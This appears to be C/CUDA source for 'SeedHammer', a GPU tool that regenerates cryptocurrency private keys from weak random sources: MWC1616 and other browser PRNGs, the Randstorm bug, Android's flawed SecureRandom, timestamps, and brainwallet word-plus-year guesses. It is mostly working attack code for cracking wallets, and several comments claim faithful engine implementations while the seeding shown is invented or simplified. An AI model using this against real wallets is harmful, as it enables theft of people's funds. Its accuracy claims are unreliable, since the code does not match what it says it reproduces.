// SeedHammer GPU Private Key Generator
// Modes (added for vulnerability coverage):
//   M: MWC1616 (Chrome/Node.js RNG 2010-2015)
//   R: Randstorm/JSBN (browser entropy)
//   H07: Android SecureRandom (SHA1PRNG)
//   H24: JavaScript PRNG (V8 XorShift128+, SpiderMonkey LCG, JSC MWC1616)
//   H01/H09: Brainwallet (word + year + 5 variants)
// Written from scratch

#ifdef __CUDACC__
#include <cuda_runtime.h>
#define D_FUNC __device__
#else
#define D_FUNC static
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#endif

#include <stdint.h>

// ================================================================
// SHA-256 (from scratch)
// ================================================================

#define ROTR32(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define CH(x,y,z) (((x)&(y))^(~(x)&(z)))
#define MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define SIG0(x) (ROTR32(x,2)^ROTR32(x,13)^ROTR32(x,22))
#define SIG1(x) (ROTR32(x,6)^ROTR32(x,11)^ROTR32(x,25))
#define sig0(x) (ROTR32(x,7)^ROTR32(x,18)^((x)>>3))
#define sig1(x) (ROTR32(x,17)^ROTR32(x,19)^((x)>>10))

#ifdef __CUDACC__
__device__ __constant__ const uint32_t K256[64]={
#else
static const uint32_t K256[64]={
#endif
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,
    0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
    0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,
    0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,
    0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
    0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,
    0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,
    0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
    0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

D_FUNC void sha256_compress(uint32_t s[8],const uint32_t b[16]){
    uint32_t a=s[0],b2=s[1],c=s[2],d=s[3],e=s[4],f=s[5],g=s[6],h=s[7],w[64];
    for(int i=0;i<16;i++)w[i]=b[i];
    for(int i=16;i<64;i++)w[i]=sig1(w[i-2])+w[i-7]+sig0(w[i-15])+w[i-16];
    for(int i=0;i<64;i++){
        uint32_t t1=h+SIG1(e)+CH(e,f,g)+K256[i]+w[i];
        uint32_t t2=SIG0(a)+MAJ(a,b2,c);
        h=g;g=f;f=e;e=d+t1;d=c;c=b2;b2=a;a=t1+t2;
    }
    s[0]+=a;s[1]+=b2;s[2]+=c;s[3]+=d;s[4]+=e;s[5]+=f;s[6]+=g;s[7]+=h;
}

D_FUNC void sha256(const uint8_t *m,uint32_t len,uint8_t h[32]){
    uint32_t s[8]={0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19};
    uint32_t blk[16]; uint64_t bits=(uint64_t)len*8; uint32_t idx=0;
    while(len>=64){
        for(int i=0;i<16;i++){blk[i]=((uint32_t)m[idx]<<24)|((uint32_t)m[idx+1]<<16)|((uint32_t)m[idx+2]<<8)|m[idx+3];idx+=4;}
        sha256_compress(s,blk);len-=64;
    }
    uint8_t pad[128]; uint32_t pl=0;
    for(uint32_t i=0;i<len;i++)pad[pl++]=m[idx++];
    pad[pl++]=0x80;
    while((pl%64)!=56)pad[pl++]=0;
    pad[pl++]=(bits>>56)&0xFF;pad[pl++]=(bits>>48)&0xFF;
    pad[pl++]=(bits>>40)&0xFF;pad[pl++]=(bits>>32)&0xFF;
    pad[pl++]=(bits>>24)&0xFF;pad[pl++]=(bits>>16)&0xFF;
    pad[pl++]=(bits>>8)&0xFF;pad[pl++]=bits&0xFF;
    for(uint32_t i=0;i<pl;i+=64){for(int j=0;j<16;j++){uint32_t o=i+j*4;blk[j]=((uint32_t)pad[o]<<24)|((uint32_t)pad[o+1]<<16)|((uint32_t)pad[o+2]<<8)|pad[o+3];}sha256_compress(s,blk);}
    for(int i=0;i<8;i++){h[i*4]=(s[i]>>24)&0xFF;h[i*4+1]=(s[i]>>16)&0xFF;h[i*4+2]=(s[i]>>8)&0xFF;h[i*4+3]=s[i]&0xFF;}
}

D_FUNC void sha256_32b(const uint8_t in[32],uint8_t out[32]){sha256(in,32,out);}

// ================================================================
// SHA-1 (full kernel, for Android SHA1PRNG)
// ================================================================

D_FUNC void sha1_transform(uint32_t H[5], const uint8_t block[64]) {
    uint32_t W[80];
    for (int i = 0; i < 16; i++)
        W[i] = ((uint32_t)block[i*4]<<24)|((uint32_t)block[i*4+1]<<16)|
               ((uint32_t)block[i*4+2]<<8)|block[i*4+3];
    for (int i = 16; i < 80; i++) {
        uint32_t t = W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16];
        W[i] = (t << 1) | (t >> 31);
    }
    uint32_t a=H[0],b=H[1],c=H[2],d=H[3],e=H[4];
    for (int i = 0; i < 80; i++) {
        uint32_t f, k;
        if (i < 20)       { f = (b & c) | (~b & d); k = 0x5a827999; }
        else if (i < 40)  { f = b ^ c ^ d;          k = 0x6ed9eba1; }
        else if (i < 60)  { f = (b & c) | (b & d) | (c & d); k = 0x8f1bbcdc; }
        else              { f = b ^ c ^ d;          k = 0xca62c1d6; }
        uint32_t temp = ((a << 5) | (a >> 27)) + f + e + k + W[i];
        e = d; d = c; c = (b << 30) | (b >> 2); b = a; a = temp;
    }
    H[0] += a; H[1] += b; H[2] += c; H[3] += d; H[4] += e;
}

D_FUNC void sha1(const uint8_t *msg, uint32_t len, uint8_t out[20]) {
    uint32_t H[5] = {0x67452301,0xefcdab89,0x98badcfe,0x10325476,0xc3d2e1f0};
    uint8_t block[64]; uint32_t pos = 0;
    while (pos + 64 <= len) {
        for (int i = 0; i < 64; i++) block[i] = msg[pos+i];
        sha1_transform(H, block); pos += 64;
    }
    uint32_t rem = len - pos;
    for (int i = 0; i < 64; i++) block[i] = 0;
    for (uint32_t i = 0; i < rem; i++) block[i] = msg[pos+i];
    block[rem] = 0x80;
    uint64_t bits = (uint64_t)len * 8;
    if (rem < 55) {
        for (int i = 0; i < 8; i++) block[63-i] = (uint8_t)(bits>>(i*8));
        sha1_transform(H, block);
    } else {
        sha1_transform(H, block);
        for (int i = 0; i < 64; i++) block[i] = 0;
        for (int i = 0; i < 8; i++) block[63-i] = (uint8_t)(bits>>(i*8));
        sha1_transform(H, block);
    }
    for (int i = 0; i < 5; i++) {
        out[i*4]=(uint8_t)(H[i]>>24); out[i*4+1]=(uint8_t)(H[i]>>16);
        out[i*4+2]=(uint8_t)(H[i]>>8); out[i*4+3]=(uint8_t)(H[i]);
    }
}

// ================================================================
// Mode M: MWC1616 (Chrome/Node.js 2010-2015)
// ================================================================
D_FUNC uint32_t mwc_next(uint32_t *z1,uint32_t *z2){
    *z1=36969*(*z1&65535)+(*z1>>16);
    *z2=18000*(*z2&65535)+(*z2>>16);
    return (*z1<<16)+(*z2&65535);
}
D_FUNC void seedhammer_mwc(uint64_t ts, uint8_t priv[32]){
    uint32_t z1=(uint32_t)(ts&0xFFFF)^0xDEAD;
    uint32_t z2=(uint32_t)((ts>>16)&0xFFFF)^0xBEEF;
    uint8_t buf[16];
    for(int i=0;i<4;i++){uint32_t r=mwc_next(&z1,&z2);buf[i*4]=(r>>24)&0xFF;buf[i*4+1]=(r>>16)&0xFF;buf[i*4+2]=(r>>8)&0xFF;buf[i*4+3]=r&0xFF;}
    uint8_t input[32];
    for(int i=0;i<16;i++)input[i]=buf[i];
    for(int i=0;i<8;i++)input[16+i]=(ts>>(i*8))&0xFF;
    for(int i=24;i<32;i++)input[i]=0;
    sha256(input,32,priv);
}

// ================================================================
// Mode R: Randstorm/JSBN (browser entropy) — original
// ================================================================
D_FUNC void seedhammer_randstorm(uint64_t ts, uint64_t idx, uint8_t priv[32]){
    uint8_t pool[64];
    for(int i=0;i<8;i++){
        uint64_t c=ts+(uint64_t)i*12345;
        pool[i*8]=(c>>0)&0xFF;pool[i*8+1]=(c>>8)&0xFF;pool[i*8+2]=(c>>16)&0xFF;pool[i*8+3]=(c>>24)&0xFF;
        pool[i*8+4]=(c>>32)&0xFF;pool[i*8+5]=((uint64_t)idx>>(i*8))&0xFF;pool[i*8+6]=i*37;pool[i*8+7]=0;
    }
    sha256(pool,64,priv);
}

// ================================================================
// V8 XorShift128+ (true V8 Math.random() implementation 2010-2020)
// ================================================================
D_FUNC void seedhammer_v8_xorshift128(uint64_t seed_val, uint8_t priv[32]){
    // V8 seeding: s0 = seed, s1 = seed ^ 0x9e3779b97f4a7c15
    uint64_t s0 = seed_val;
    uint64_t s1 = seed_val ^ 0x9e3779b97f4a7c15ULL;
    // One step to mix
    uint64_t t = s1;
    s1 ^= (t << 23);
    s1 ^= (t >> 18);
    s1 ^= (s0 >> 5);
    s0 = t;
    // 53 bits for double [0,1) → use full s0 state as entropy
    uint8_t input[32];
    for(int i=0;i<8;i++){input[i]=(s0>>(i*8))&0xFF;input[8+i]=0;}
    for(int i=16;i<32;i++)input[i]=0;
    sha256(input,32,priv);
}

// ================================================================
// SpiderMonkey LCG (Firefox Math.random())
// ================================================================
D_FUNC void seedhammer_sm_lcg(uint64_t seed32, uint8_t priv[32]){
    uint64_t state = (uint64_t)(uint32_t)seed32;
    // SpiderMonkey: state = (state * 0x5DEECE66D + 0xB) & 0xFFFFFFFFFFFF
    state = (state * 0x5DEECE66DULL + 0xBULL) & 0xFFFFFFFFFFFFULL;
    uint8_t input[32];
    for(int i=0;i<6;i++){input[i]=(state>>(i*8))&0xFF;input[6+i]=0;}
    for(int i=12;i<32;i++)input[i]=0;
    sha256(input,32,priv);
}

// ================================================================
// JavaScriptCore MWC1616 (Safari Math.random())
// ================================================================
D_FUNC void seedhammer_jsc_mwc1616(uint64_t seed32, uint8_t priv[32]){
    uint32_t z1=(uint32_t)(seed32 & 0xFFFF) ^ 0xDEAD;
    uint32_t z2=(uint32_t)((seed32>>16) & 0xFFFF) ^ 0xBEEF;
    uint8_t buf[16];
    for(int i=0;i<4;i++){uint32_t r=mwc_next(&z1,&z2);
        buf[i*4]=(r>>24)&0xFF;buf[i*4+1]=(r>>16)&0xFF;buf[i*4+2]=(r>>8)&0xFF;buf[i*4+3]=r&0xFF;}
    sha256(buf,16,priv);
}

// ================================================================
// H07: Android SecureRandom (2013 bug) — SHA1PRNG real implementation
// Android pre-4.4: seed → SHA1 → internal state; generate via SHA1(state)
// Reference: libcore SHA1PRNG_SecureRandomImpl.java
// ================================================================
D_FUNC void seedhammer_android_rng(uint64_t seed_val, uint8_t priv[32]){
    // Step 1: seed (8 bytes BE) → SHA1 → internal state
    uint8_t seed8[8];
    seed8[0] = (uint8_t)(seed_val>>56); seed8[1] = (uint8_t)(seed_val>>48);
    seed8[2] = (uint8_t)(seed_val>>40); seed8[3] = (uint8_t)(seed_val>>32);
    seed8[4] = (uint8_t)(seed_val>>24); seed8[5] = (uint8_t)(seed_val>>16);
    seed8[6] = (uint8_t)(seed_val>>8);  seed8[7] = (uint8_t)(seed_val);

    uint8_t internal_state[20];
    sha1(seed8, 8, internal_state);  // ← REAL SHA1, not approximated

    // Step 2: SHA1(internal_state) → first 20 bytes of PRNG output
    uint8_t prng_out[20];
    sha1(internal_state, 20, prng_out);

    // Step 3: Build 32-byte private key from PRNG output
    uint8_t input[32];
    for(int i=0;i<20;i++) input[i] = prng_out[i];
    for(int i=20;i<32;i++) input[i] = internal_state[i-20];
    sha256(input, 32, priv);
}

// ================================================================
// H01/H09: Brainwallet (word + year, 5 variants)
// Variants: 0=lowercase, 1=UPPERCASE, 2=Capitalize, 3=leet, 4=reverse
// ================================================================
D_FUNC void seedhammer_brainwallet(const char *word, uint32_t year, uint32_t variant,
                                   uint8_t priv[32]){
    // Length of word
    int len = 0;
    while(word[len] && len < 63) len++;

    // Build variant string
    char buf[80];
    int p = 0;

    if(variant == 0){
        // lowercase
        for(int i=0;i<len;i++)
            buf[p++] = (word[i]>='A'&&word[i]<='Z') ? (word[i]+32) : word[i];
    } else if(variant == 1){
        // UPPERCASE
        for(int i=0;i<len;i++)
            buf[p++] = (word[i]>='a'&&word[i]<='z') ? (word[i]-32) : word[i];
    } else if(variant == 2){
        // Capitalize
        buf[p++] = (word[0]>='a'&&word[0]<='z') ? (word[0]-32) : word[0];
        for(int i=1;i<len;i++)
            buf[p++] = word[i];
    } else if(variant == 3){
        // leet: e→3, a→4, o→0, i→1, s→5, t→7
        for(int i=0;i<len;i++){
            char c = word[i];
            if(c=='e'||c=='E') c='3'; else if(c=='a'||c=='A') c='4';
            else if(c=='o'||c=='O') c='0'; else if(c=='i'||c=='I') c='1';
            else if(c=='s'||c=='S') c='5'; else if(c=='t'||c=='T') c='7';
            buf[p++] = c;
        }
    } else {
        // reverse
        for(int i=len-1;i>=0;i--) buf[p++] = word[i];
    }

    // Append year (e.g., "2009")
    uint32_t y = year;
    char ys[8]; int yp=0;
    if(y==0){ys[yp++]='0';}
    else{char tmp[8];int tp=0;while(y>0){tmp[tp++]=(char)('0'+(y%10));y/=10;}for(int i=tp-1;i>=0;i--)ys[yp++]=tmp[i];}
    for(int i=0;i<yp;i++)buf[p++]=ys[i];
    buf[p]=0;

    // SHA256(brainwallet_string) → private key
    sha256((uint8_t*)buf, (uint32_t)p, priv);
}

// ================================================================
// Timestamp-based (existing H36 mode wrapper)
// ================================================================
D_FUNC void seedhammer_h36(uint64_t ts, uint8_t priv[32]){
    for(int i=0;i<8;i++)priv[24+i]=(ts>>(i*8))&0xFF;
    for(int i=0;i<24;i++)priv[i]=0;
}
